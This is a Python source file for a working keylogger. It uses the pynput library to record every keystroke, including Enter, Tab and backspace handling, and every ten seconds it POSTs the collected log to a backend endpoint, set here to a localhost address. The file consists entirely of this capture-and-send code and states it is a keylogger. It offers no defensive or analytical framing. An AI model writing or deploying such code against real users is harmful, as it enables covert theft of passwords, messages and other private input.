import requests
from pynput import keyboard
import threading
import datetime

log = ""
log_file = "keylog.txt"
interval = 10
BACKEND_URL = 'http://127.0.0.1:5000/log' 

def send_log_to_backend(log_data):
    try:
        response = requests.post(BACKEND_URL, json={"log": log_data})
        if response.status_code == 200:
            print("Log sent successfully!")
        else:
            print("Failed to send log.")
    except Exception as e:
        print(f"Error sending log: {e}")

def save_log():
    global log
    if log:
        send_log_to_backend(log)  # Send log to backend instead of saving locally
        log = ""
    timer = threading.Timer(interval, save_log)
    timer.start()

def on_press(key):
    global log

    try:
        if key == keyboard.Key.space:
            log += " "
        elif key == keyboard.Key.enter:
            log += "[ENTER]\n"
        elif key == keyboard.Key.tab:
            log += "[TAB]"
        elif key == keyboard.Key.backspace:
            log = log[:-1]
        elif key == keyboard.Key.esc:
            send_log_to_backend(log)  
            return False  
        else:
            log += str(key.char)
    except AttributeError:
        log += f"[{key.name.upper()}]"

print("[*] Starting keylogger...")
save_log()

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
